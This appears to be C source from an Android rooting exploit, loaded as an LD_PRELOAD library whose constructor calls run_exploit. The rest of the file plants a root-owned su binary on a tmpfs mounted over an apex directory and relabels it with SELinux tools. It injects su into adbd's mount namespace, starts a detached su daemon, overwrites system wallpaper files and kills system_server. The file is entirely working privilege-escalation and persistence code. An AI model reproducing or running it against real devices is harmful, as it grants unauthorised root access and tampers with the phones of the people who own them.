#include "common.h"
#include <sys/mount.h>

#define SU_DST_DIR "/apex/com.android.virt/bin"
#define SU_DST SU_DST_DIR "/su"
#define SU_LOCAL "/data/local/tmp/su"
#define SU_SOCK "/data/local/tmp/temp_su.sock"
#define SU_LOG "/data/local/tmp/su_daemon.log"
#define WALLPAPER_PRIMARY "/sdcard/wallpaper.webp"
#define WALLPAPER_FALLBACK "wallpaper.webp"
#define WALLPAPER_DATA "/data/system/users/0/wallpaper"
#define WALLPAPER_ORIG "/data/system/users/0/wallpaper_orig"
#define WALLPAPER_INFO "/data/system/users/0/wallpaper_info.xml"
#define AID_SYSTEM 1000

extern const unsigned char embedded_su_start[];
extern const unsigned char embedded_su_end[];
extern const unsigned char embedded_wallpaper_start[];
extern const unsigned char embedded_wallpaper_end[];

static int write_full(int fd, const void *buf, size_t len) {
  const unsigned char *p = buf;
  while (len) {
    ssize_t n = write(fd, p, len);
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      return 0;
    }
    p += n;
    len -= (size_t)n;
  }
  return 1;
}

static int path_is_mounted(const char *path) {
  int fd = open("/proc/mounts", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  char mounts[16384];
  ssize_t n = read(fd, mounts, sizeof(mounts) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    return 0;
  }
  mounts[n] = 0;

  char needle[512];
  snprintf(needle, sizeof(needle), " %s ", path);
  return strstr(mounts, needle) != NULL;
}

static int ensure_su_mount(void) {
  if (path_is_mounted(SU_DST_DIR)) {
    return 1;
  }
  if (mount("tmpfs", SU_DST_DIR, "tmpfs", 0, "mode=0755,size=4m") == 0) {
    return 1;
  }
  return errno == EBUSY;
}

static void try_chcon(const char *path) {
  pid_t pid = fork();
  if (pid == 0) {
    execl("/system/bin/chcon", "chcon", "u:object_r:system_file:s0",
          path, (char *)NULL);
    _exit(127);
  }
  if (pid > 0) {
    while (waitpid(pid, NULL, 0) < 0 && errno == EINTR) {
    }
  }
}

static int write_embedded_su_file(const char *dir, const char *dst) {
  char tmp[256];
  snprintf(tmp, sizeof(tmp), "%s/.su.new.%d", dir, getpid());
  unlink(tmp);

  size_t size = (size_t)(embedded_su_end - embedded_su_start);
  int fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
  if (fd < 0) {
    return 0;
  }
  int ok = write_full(fd, embedded_su_start, size);
  int saved_errno = errno;
  if (ok) {
    ok = fchown(fd, 0, 0) == 0 && fchmod(fd, 0755) == 0;
    saved_errno = errno;
  }
  if (close(fd) != 0 && ok) {
    ok = 0;
    saved_errno = errno;
  }
  if (!ok) {
    unlink(tmp);
    errno = saved_errno;
    return 0;
  }

  try_chcon(tmp);
  if (rename(tmp, dst) != 0) {
    saved_errno = errno;
    unlink(tmp);
    errno = saved_errno;
    return 0;
  }
  try_chcon(dst);
  pr_success("embedded su wrote %zu bytes to %s\n", size, dst);
  return 1;
}

static int write_embedded_su(void) {
  if (!ensure_su_mount()) {
    return 0;
  }
  return write_embedded_su_file(SU_DST_DIR, SU_DST);
}

static pid_t find_adbd_pid(void) {
  DIR *dir = opendir("/proc");
  if (!dir) {
    return -1;
  }

  struct dirent *de;
  while ((de = readdir(dir)) != NULL) {
    char *end = NULL;
    long pid_long = strtol(de->d_name, &end, 10);
    if (!end || *end || pid_long <= 1 || pid_long > INT32_MAX) {
      continue;
    }

    char path[64];
    snprintf(path, sizeof(path), "/proc/%ld/comm", pid_long);
    char comm[32];
    read_first_line(path, comm, sizeof(comm));
    if (strcmp(comm, "adbd") == 0) {
      closedir(dir);
      return (pid_t)pid_long;
    }
  }

  closedir(dir);
  return -1;
}

static int install_su_in_pid_mntns(pid_t target) {
  pid_t child = fork();
  if (child == 0) {
    char ns_path[64];
    snprintf(ns_path, sizeof(ns_path), "/proc/%d/ns/mnt", target);
    int ns_fd = open(ns_path, O_RDONLY | O_CLOEXEC);
    if (ns_fd < 0) {
      _exit(2);
    }
    if (setns(ns_fd, CLONE_NEWNS) != 0) {
      _exit(3);
    }
    close(ns_fd);
    if (!ensure_su_mount()) {
      _exit(4);
    }
    _exit(write_embedded_su_file(SU_DST_DIR, SU_DST) ? 0 : 5);
  }
  if (child < 0) {
    return 0;
  }

  int status = 0;
  while (waitpid(child, &status, 0) < 0 && errno == EINTR) {
  }
  return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

static int install_adb_visible_su(void) {
  pid_t adbd = find_adbd_pid();
  if (adbd <= 0) {
    pr_info("adb-visible su skipped: adbd pid not found\n");
    return 0;
  }
  int ok = install_su_in_pid_mntns(adbd);
  pr_info("adb-visible su install adbd=%d ok=%d path=%s\n", adbd, ok, SU_DST);
  return ok;
}

static int install_local_su_client(void) {
  int ok = write_embedded_su_file("/data/local/tmp", SU_LOCAL);
  pr_info("local su client install ok=%d path=%s\n", ok, SU_LOCAL);
  return ok;
}

static void install_extra_su_clients(void) {
  install_local_su_client();
  install_adb_visible_su();
}

static pid_t start_su_daemon(void) {
  unlink(SU_SOCK);
  unlink(SU_LOG);

  pid_t pid = fork();
  if (pid == 0) {
    setsid();
    int null_fd = open("/dev/null", O_RDONLY | O_CLOEXEC);
    if (null_fd >= 0) {
      dup2(null_fd, STDIN_FILENO);
    }
    int log_fd = open(SU_LOG, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
    if (log_fd >= 0) {
      dup2(log_fd, STDOUT_FILENO);
      dup2(log_fd, STDERR_FILENO);
    }

    long max_fd = sysconf(_SC_OPEN_MAX);
    if (max_fd < 0 || max_fd > 65536) {
      max_fd = 65536;
    }
    for (int fd = STDERR_FILENO + 1; fd < max_fd; fd++) {
      close(fd);
    }
    execl(SU_DST, "su", "--daemon", (char *)NULL);
    _exit(127);
  }
  return pid;
}

int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  if (!write_embedded_su()) {
    return 0;
  }
  install_extra_su_clients();

  pid_t pid = start_su_daemon();
  if (pid <= 0) {
    return 0;
  }
  if (daemon_pid) {
    *daemon_pid = pid;
  }

  for (int i = 0; i < 50; i++) {
    if (access(SU_SOCK, F_OK) == 0) {
      pr_success("embedded su daemon ready pid=%d socket=%s\n", pid, SU_SOCK);
      return 1;
    }
    usleep(100000);
  }

  errno = ETIMEDOUT;
  return 0;
}

static int write_embedded_wallpaper_file(const char *path, mode_t mode) {
  size_t size = (size_t)(embedded_wallpaper_end - embedded_wallpaper_start);
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, mode);
  if (fd < 0) {
    return 0;
  }

  int ok = write_full(fd, embedded_wallpaper_start, size);
  int saved_errno = errno;
  if (close(fd) != 0 && ok) {
    ok = 0;
    saved_errno = errno;
  }
  if (!ok) {
    errno = saved_errno;
    return 0;
  }

  pr_success("embedded wallpaper wrote %zu bytes to %s\n", size, path);
  return 1;
}

static int restorecon_wallpaper_files(void) {
  pid_t pid = fork();
  if (pid == 0) {
    execl("/system/bin/restorecon", "restorecon", WALLPAPER_DATA,
          WALLPAPER_ORIG, (char *)NULL);
    _exit(127);
  }
  if (pid < 0) {
    return 0;
  }

  int status = 0;
  while (waitpid(pid, &status, 0) < 0) {
    if (errno != EINTR) {
      return 0;
    }
  }
  if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
    return 1;
  }
  errno = WIFEXITED(status) ? WEXITSTATUS(status) : ECHILD;
  return 0;
}

static pid_t find_comm_pid(const char *want) {
  DIR *dir = opendir("/proc");
  if (!dir) {
    return -1;
  }

  struct dirent *de;
  while ((de = readdir(dir)) != NULL) {
    char *end = NULL;
    long pid_long = strtol(de->d_name, &end, 10);
    if (!end || *end || pid_long <= 1 || pid_long > INT32_MAX) {
      continue;
    }

    char path[64];
    snprintf(path, sizeof(path), "/proc/%ld/comm", pid_long);
    char comm[32];
    read_first_line(path, comm, sizeof(comm));
    if (strcmp(comm, want) == 0) {
      closedir(dir);
      return (pid_t)pid_long;
    }
  }

  closedir(dir);
  return -1;
}

static int restart_wallpaper_framework(void) {
  pid_t system_server = find_comm_pid("system_server");
  if (system_server <= 0) {
    errno = ESRCH;
    return 0;
  }
  int ok = kill(system_server, SIGKILL) == 0;
  int saved_errno = errno;
  pr_info("wallpaper reload kill system_server=%d ok=%d errno=%d\n",
          system_server, ok, saved_errno);
  errno = saved_errno;
  return ok;
}

int install_embedded_wallpaper(void) {
  int ok = write_embedded_wallpaper_file(WALLPAPER_PRIMARY, 0644);
  int saved_errno = errno;
  if (!ok) {
    pr_warning("embedded wallpaper primary write failed path=%s errno=%d\n",
               WALLPAPER_PRIMARY, saved_errno);
    ok = write_embedded_wallpaper_file(WALLPAPER_FALLBACK, 0644);
    saved_errno = errno;
  }
  if (!ok) {
    errno = saved_errno;
    return 0;
  }

  ok = write_embedded_wallpaper_file(WALLPAPER_DATA, 0600) &&
       write_embedded_wallpaper_file(WALLPAPER_ORIG, 0600);
  saved_errno = errno;
  if (ok) {
    unlink(WALLPAPER_INFO);
    ok = chown(WALLPAPER_DATA, AID_SYSTEM, AID_SYSTEM) == 0 &&
         chown(WALLPAPER_ORIG, AID_SYSTEM, AID_SYSTEM) == 0 &&
         chmod(WALLPAPER_DATA, 0600) == 0 &&
         chmod(WALLPAPER_ORIG, 0600) == 0 &&
         restorecon_wallpaper_files();
    saved_errno = errno;
  }
  if (ok) {
    ok = restart_wallpaper_framework();
    saved_errno = errno;
  }

  pr_info("wallpaper install data=%s ok=%d errno=%d\n",
          WALLPAPER_DATA, ok, saved_errno);
  errno = saved_errno;
  return ok;
}

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;

  unsetenv("LD_PRELOAD");

  char *argv[2] = {
    "preload.so",
    NULL,
  };

  pr_success("preload starting pid=%d\n", getpid());
  run_exploit(1, argv);
}
